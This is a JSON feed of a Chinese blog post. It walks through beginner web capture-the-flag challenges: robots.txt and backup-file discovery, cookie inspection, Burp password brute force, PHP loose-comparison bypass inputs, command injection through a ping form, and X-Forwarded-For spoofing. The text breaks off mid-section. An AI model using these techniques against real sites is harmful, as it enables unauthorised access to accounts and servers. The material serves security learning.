{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"web的学习\" category",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2023/08/24/web-new/",
            "url": "https://yhuanhuan01.github.io/2023/08/24/web-new/",
            "title": "web_new",
            "date_published": "2023-08-24T15:55:12.000Z",
            "content_html": "<h1 id=\"web新手\"><a class=\"markdownIt-Anchor\" href=\"#web新手\">#</a> web 新手：</h1>\n<p>攻防世界 WEB 区复现：</p>\n<h2 id=\"robots\"><a class=\"markdownIt-Anchor\" href=\"#robots\">#</a> robots:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824195924438.png\" alt=\"image-20230824195924438\"></p>\n<blockquote>\n<p>robots.txt 文件是一个文本文件，使用任何一个常见的文本编辑器，比如 Windows 系统安装了 Notepad，就可以创建和编辑它</p>\n<p>robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>\n<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用 robots.txt 文件。如果您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。</p>\n<p>如果将网站视为酒店里的一个房间，robots.txt 就是主人在房间门口悬挂的 “请勿打扰” 或 “欢迎打扫” 的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但 robots.txt 不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824200258007.png\" alt=\"image-20230824200258007\"></p>\n<blockquote>\n<p>拙见：Disallow 就是禁止的意思</p>\n<p>​\t\t   Allow 就是允许的意思</p>\n</blockquote>\n<p>回归该题：</p>\n<p><img data-src=\"/img/webpic/image-20230824200522350.png\" alt=\"image-20230824200522350\"></p>\n<p>当我们去访问 robots.txt 的时候，发现所有的搜索引擎不允许去访问  f1ag_1s_h3re.php 文件，说明这是敏感信息。根据提示，我们去访问这个文件。</p>\n<p><img data-src=\"/img/webpic/image-20230824201130674.png\" alt=\"image-20230824201130674\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"backup\"><a class=\"markdownIt-Anchor\" href=\"#backup\">#</a> backup:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201515063.png\" alt=\"image-20230824201515063\"></p>\n<blockquote>\n<p>提示是去寻找备份文件</p>\n</blockquote>\n<p>打开界面：</p>\n<p><img data-src=\"/img/webpic/image-20230824201448729.png\" alt=\"\"></p>\n<blockquote>\n<p>很容易想到，这里要找 index.php 的备份文件。</p>\n<p>web 网页常见的备份文件后缀名：“.git”,“.svn”,“.swp”,“.~”,“.bak”,“.bash_history”,“.bkf”</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824201722649.png\" alt=\"image-20230824201722649\"></p>\n<p><img data-src=\"/img/webpic/image-20230824201755816.png\" alt=\"image-20230824201755816\"></p>\n<p>获取 flag。</p>\n<h2 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\">#</a> cookie:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201926829.png\" alt=\"image-20230824201926829\"></p>\n<p>根据提示，cookie 里面有东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202025146.png\" alt=\"image-20230824202025146\"></p>\n<blockquote>\n<p>Cookie 是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个 Cookie 文件用于记录登录信息。目前，大多数网站都会应用 Cookie 技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。</p>\n<h2 id=\"cookie有哪些特性\"><a class=\"markdownIt-Anchor\" href=\"#cookie有哪些特性\">#</a> Cookie 有哪些特性:</h2>\n<p>首先，是 Cookie 的实效性。目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>\n<p>其次，是 Cookie 的限制性。Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p>\n<h2 id=\"cookie有什么作用\"><a class=\"markdownIt-Anchor\" href=\"#cookie有什么作用\">#</a> Cookie 有什么作用:</h2>\n<p>Cookie 对于网站开发者而言，从某个角度理解更像浏览器的 “缓存” 它清晰的记录你的行为指标，有利于：</p>\n<p>（1）获取精准的访客画像：用户位置、访问喜好、年龄结构、特定账号信息等。</p>\n<p>（2）广告联盟：提供更加精准的相关产品信息，这也是为什么，当你搜索某个产品以后，在各大电商网站或带有广告联盟代码的站点，经常出现同类产品的原因。</p>\n<p>（3）推进更多个性化的内容信息，延迟页面停留时间，提高转化率。</p>\n</blockquote>\n<p>这里我们采用 burp 抓一下包：</p>\n<p><img data-src=\"/img/webpic/image-20230824202352929.png\" alt=\"image-20230824202352929\"></p>\n<p>发现有一个 cookie.php, 尝试一下：</p>\n<p><img data-src=\"/img/webpic/image-20230824202455049.png\" alt=\"image-20230824202455049\"></p>\n<p>当我们传到 url 上的时候，提示我们请看 http response，所以 cookie 应该是在响应包的一个东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202815382.png\" alt=\"image-20230824202815382\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"disabled_button\"><a class=\"markdownIt-Anchor\" href=\"#disabled_button\">#</a> disabled_button:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203157237.png\" alt=\"image-20230824203157237\"></p>\n<p>当我们打开网页：</p>\n<p><img data-src=\"/img/webpic/image-20230824203237567.png\" alt=\"image-20230824203237567\"></p>\n<p>发现此按钮不能按下去。</p>\n<p><img data-src=\"/img/webpic/image-20230824203315948.png\" alt=\"image-20230824203315948\"></p>\n<p>f12 查看源码，发现输入有上面的字段：</p>\n<blockquote>\n<p>当 input 的属性设置为 disabled=“disabled“时，表单不会提交此 input 的数据</p>\n</blockquote>\n<blockquote>\n<p>disabled：对于全部的表单元素都有效，包括 select, radio, checkbox, button 等。若是一个输入项的 disabled 设为 true，则该表单输入项不能获取焦点，用户的全部操做（鼠标点击和键盘输入等）对该输入项都无效，最重要的一点是当提交表单时，这个表单输入项将不会被提交。</p>\n<p>readonly：只针对 input (text /password) 和 textarea 有效；若是设为 true，用户只是不能编辑对应的文本，可是仍然能够聚焦焦点，而且在提交表单的时候，该输入项会做为 form 的一项提交。</p>\n</blockquote>\n<p>所以我们将其删掉就行。</p>\n<p><img data-src=\"/img/webpic/image-20230824203628188.png\" alt=\"image-20230824203628188\"></p>\n<p><img data-src=\"/img/webpic/image-20230824203644118.png\" alt=\"image-20230824203644118\"></p>\n<p>得到 flag</p>\n<h2 id=\"get_post\"><a class=\"markdownIt-Anchor\" href=\"#get_post\">#</a> get_post:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203743132.png\" alt=\"image-20230824203743132\"></p>\n<p>两种请求方式：</p>\n<p><img data-src=\"/img/webpic/image-20230824204018624.png\" alt=\"image-20230824204018624\"></p>\n<blockquote>\n<p>GET 请求直接在 url 后，进行参数的添加。</p>\n<p>POST 请求需要借助 hackbar。</p>\n</blockquote>\n<p>另外几种请求：</p>\n<p><img data-src=\"/img/webpic/image-20230824204218269.png\" alt=\"image-20230824204218269\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204233311.png\" alt=\"image-20230824204233311\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204248645.png\" alt=\"image-20230824204248645\"></p>\n<p>回归题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824204355681.png\" alt=\"image-20230824204355681\"></p>\n<p>得到 flag</p>\n<h2 id=\"weak_auth\"><a class=\"markdownIt-Anchor\" href=\"#weak_auth\">#</a> weak_auth:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824204503329.png\" alt=\"image-20230824204503329\"></p>\n<p>题目是个弱密码题目：</p>\n<p>可以直接猜简单密码进行登录，也可以用 burp 进行爆破。</p>\n<p><img data-src=\"/img/webpic/image-20230824204634276.png\" alt=\"image-20230824204634276\"></p>\n<p>进入网页后是这样的界面。</p>\n<p><img data-src=\"/img/webpic/image-20230824204721446.png\" alt=\"image-20230824204721446\"></p>\n<p>当我们输入用户名时，提示我们用 admin 去登录。所以这题我们只需要去爆破密码即可。</p>\n<p>当我们请求操作时，拦截下来这样的数据包。</p>\n<p><img data-src=\"/img/webpic/image-20230824204915845.png\" alt=\"image-20230824204915845\"></p>\n<p>这样去构造 payload 去进行爆破密码</p>\n<p><img data-src=\"/img/webpic/image-20230824205021958.png\" alt=\"image-20230824205021958\"></p>\n<p>加载我们的密码字典，开始攻击</p>\n<p><img data-src=\"/img/webpic/image-20230824205112705.png\" alt=\"image-20230824205112705\"></p>\n<p>从长度获知密码应为 123456</p>\n<p><img data-src=\"/img/webpic/image-20230824205327991.png\" alt=\"image-20230824205327991\"></p>\n<p>查看响应包：</p>\n<p><img data-src=\"/img/webpic/image-20230824205351133.png\" alt=\"image-20230824205351133\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> simple_php:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824205450364.png\" alt=\"image-20230824205450364\"></p>\n<p><img data-src=\"/img/webpic/image-20230824205521655.png\" alt=\"image-20230824205521655\"></p>\n<p>发现是 php 去需要判断的再能获取两个部分的 flag 的。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>== 弱类型比较。需要了解 php 类型比较的特性。</p>\n<p><strong>PHP 类型比较</strong></p>\n<ul>\n<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>\n<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>\n</ul>\n<p>** 方法：**php 中的弱类型比较会使’abc’ == 0 为真，所以输入 a=abc 时，可得到 flag1</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>is_numeric () 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE, 且 php 中弱类型比较时，会使 (‘1234a’ == 1234)</p>\n<p>** 方法：** 输入 b=1235c 即可。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210310021.png\" alt=\"image-20230824210310021\"></p>\n<h2 id=\"command_execution\"><a class=\"markdownIt-Anchor\" href=\"#command_execution\">#</a> command_execution:&gt;</h2>\n<blockquote>\n<p>命令执行</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210429004.png\" alt=\"image-20230824210429004\"></p>\n<blockquote>\n<p><strong>WAF:</strong></p>\n<p>Web 应用程序防火墙（有时也简称为 WAF ）可以通过监视和过滤 Internet 与网站之间的 HTTP 通信来保护网站。</p>\n<p>一个 WAF 可以防止网站受跨站请求伪造的喜欢（被攻击 CSRF），本地文件包含（LFI），SQL 注入，跨站点脚本（XSS），等等。</p>\n<p>输入验证效果不佳的网站可能容易受到代码注入漏洞的攻击，这使攻击者试图让 SQL 语句潜行以访问未经授权的数据库。WAF 可以检测并阻止这些尝试。过时的库和软件也是易受攻击的领域，但 Web 应用程序防火墙可以用作临时解决方案，并阻止这些漏洞，并对其进行修补。</p>\n</blockquote>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824210729558.png\" alt=\"image-20230824210729558\"></p>\n<blockquote>\n<p>ping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP/IP 参数是否设置正确，以及运行是否正常、网络是否通畅等</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824211021366.png\" alt=\"image-20230824211021366\"></p>\n<p>发现有回显，这下来进行拼接，执行命令注入：</p>\n<p><img data-src=\"/img/webpic/image-20230824211133151.png\" alt=\"image-20230824211133151\"></p>\n<p>发现 ls 被执行。</p>\n<p><img data-src=\"/img/webpic/image-20230824211309540.png\" alt=\"image-20230824211309540\"></p>\n<p>找到 flag 位置</p>\n<p><img data-src=\"/img/webpic/image-20230824211410392.png\" alt=\"image-20230824211410392\"></p>\n<p>得到 flag</p>\n<h2 id=\"xff_referer\"><a class=\"markdownIt-Anchor\" href=\"#xff_referer\">#</a> xff_referer:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824211448543.png\" alt=\"image-20230824211448543\"></p>\n<p>记录一下：&gt;</p>\n<blockquote>\n<p>​\t**User-Agent：** 使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>\n<p>​\t**Cookie：** 网站为了辨别用户身份进行 session 跟踪，并储存在用户本地终端上的数据（通常经过加密）</p>\n<p>​\t <strong>X-Forwarded-For</strong>：简称 XFF 头，代表了 HTTP 的请求端真实的 IP。它被认为是客户端通过 HTTP 代理或者负载均衡器连接到 web 服务端获取源 ip 地址的一个标准（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库或某文件 [通过修改 XXF 头可以实现伪造 IP]）。</p>\n<p>​\t**Referer：** 浏览器向 WEB 服务器表明自己的页面来源。</p>\n<p>​\t**Host：** 客户端指定自己想访问的 WEB 服务器的域名 / IP 地址和端口号。</p>\n</blockquote>\n<blockquote>\n<p><strong>02XFF 注入的概念</strong></p>\n<p>​\tXFF，是 X-Forwarded-for 的缩写，属于 SQL 注入的一种，该注入原理是通过修改 X-Forwarded-for 头对带入系统的 dns 进行 sql 注入，达到欺骗服务器执行恶意的 SQL 命令的效果，从而可以得到网站的数据库内容。</p>\n<p><strong>03XFF 的危害</strong></p>\n<p>​\t①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p>\n<p>​\t②网页篡改：通过操作数据库对特定网页进行篡改。</p>\n<p>​\t③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p>\n<p>​\t④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</p>\n<p>​\t⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824212024008.png\" alt=\"image-20230824212024008\"></p>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824211956203.png\" alt=\"image-20230824211956203\"></p>\n<p>提示 ip 必须 123.123.123.123，利用 xff 伪造 ip。</p>\n<p>使用 burp</p>\n<p><img data-src=\"/img/webpic/image-20230824215131470.png\" alt=\"image-20230824215131470\"></p>\n<p>进行请求伪造：</p>\n<p><img data-src=\"/img/webpic/image-20230824215155754.png\" alt=\"image-20230824215155754\"></p>\n<p>得到 flag</p>\n<h2 id=\"training-www-robots\"><a class=\"markdownIt-Anchor\" href=\"#training-www-robots\">#</a> Training-WWW-Robots:&gt;</h2>\n<blockquote>\n<p>很明显，这还是一个和 Robots 有关的题目</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824215510884.png\" alt=\"image-20230824215510884\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215659606.png\" alt=\"image-20230824215659606\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215731279.png\" alt=\"image-20230824215731279\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_js\"><a class=\"markdownIt-Anchor\" href=\"#simple_js\">#</a> simple_js:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824215817083.png\" alt=\"image-20230824215817083\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215915164.png\" alt=\"image-20230824215915164\"></p>\n<p>题目界面</p>\n<p>用 burp 抓一下包。看下响应的情况。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 传入的密码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 需要比对的密码  // 这是报错信息  FAUX PASSWORD HAHA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 对传入的密码插入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                                        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 这里只返回了部分字符</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 需要对比的密码</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>pass_enc**.split (**) 方法用于把一个字符串分割成字符串数组</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ascii 转字符串</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hex_string <span class=\"token operator\">=</span> <span class=\"token string\">r\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_values <span class=\"token operator\">=</span> hex_string<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hex_value<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> hex_value <span class=\"token keyword\">in</span> hex_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ascii_values <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">107</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> ascii_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#55,56,54,79,115,69,114,116,107,49,50</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#786OsErtk12</span></pre></td></tr></table></figure><blockquote 786OsErtk12=\"\">\n<p>flag</p>\n</blockquote>\n<h2 id=\"baby_web\"><a class=\"markdownIt-Anchor\" href=\"#baby_web\">#</a> baby_web:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824221304273.png\" alt=\"image-20230824221304273\"></p>\n<p><img data-src=\"/img/webpic/image-20230824221335028.png\" alt=\"image-20230824221335028\"></p>\n<p>进入题目页面。初始页面一般是 index.php</p>\n<p>试着传入 index.php 试一下</p>\n<p>但是又回到 1.php</p>\n<p>用 burp 传一下试一下</p>\n<p><img data-src=\"/img/webpic/image-20230824221652725.png\" alt=\"image-20230824221652725\"></p>\n<p>成功找到 flag</p>\n<h2 id=\"php2\"><a class=\"markdownIt-Anchor\" href=\"#php2\">#</a> PHP2:&gt;</h2>\n<blockquote>\n<p>前置知识：</p>\n<p>phps 即为 PHP Source。</p>\n<p>phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 